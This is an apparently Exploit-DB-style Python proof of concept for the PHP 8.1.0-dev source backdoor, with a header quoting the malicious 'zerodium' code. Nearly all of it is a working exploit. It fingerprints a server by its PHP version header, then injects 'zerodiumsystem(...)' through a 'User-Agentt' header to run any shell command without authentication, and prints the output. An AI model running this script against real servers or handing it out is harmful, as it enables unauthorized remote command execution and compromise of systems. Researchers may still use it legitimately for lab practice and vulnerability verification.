# Exploit Title: PHP 8.1.0-dev (backdoor) | Remote Command Injection (Unauthenticated)
# Date: 23/05/2021
# Exploit Author: Richard Jones
# Vendor Homepage: https://www.php.net/
# Software Link: https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor
# Version: PHP 8.1.0-dev
# Tested on: Linux Ubuntu 20.04.2 LTS (5.4.0-72-generic)

# Based on the recent PHP/8.1.0-dev backdoor
# Infomation: https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a?branch=2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a&diff=unified#diff-a35f2ee9e1d2d3983a3270ee10ec70bf86349c53febdeabdf104f88cb2167961R368-R370
# Reference: https://news-web.php.net/php.internals/113838
# Vuln code in the link above (Original)
# When adding "zerodium" or  at the start of the user-agent field, will execute php code on the server
#  convert_to_string(enc);
#	if (strstr(Z_STRVAL_P(enc), "zerodium")) {
#		zend_try {
#			zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");


#Usage: python3 php_8.1.0-dev.py -u http://10.10.10.242/ -c ls

#!/usr/bin/env python3
import requests
import argparse

from requests.models import parse_header_links 

s = requests.Session()

def checkTarget(args):
    r = s.get(args.url)    
    for h in r.headers.items():
        if "PHP/8.1.0-dev" in h[1]:
            return True
    return False


def execCmd(args):
    r = s.get(args.url, headers={"User-Agentt":"zerodiumsystem(\""+args.cmd+"\");"})
    res = r.text.split("<!DOCTYPE html>")[0]
    if not res:
        print("[-] No Results")
    else:
        print("[+] Results:")
    print(res.strip())


def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Target URL (Eg: http://10.10.10.10/)", required=True)
    parser.add_argument("-c", "--cmd", help="Command to execute (Eg: ls,id,whoami)", default="id")
    args = parser.parse_args()

    if checkTarget(args):
        execCmd(args)
    else:
        print("[!] Not Vulnerable or url error")
        exit(0)
    
if __name__ == "__main__":
    main()
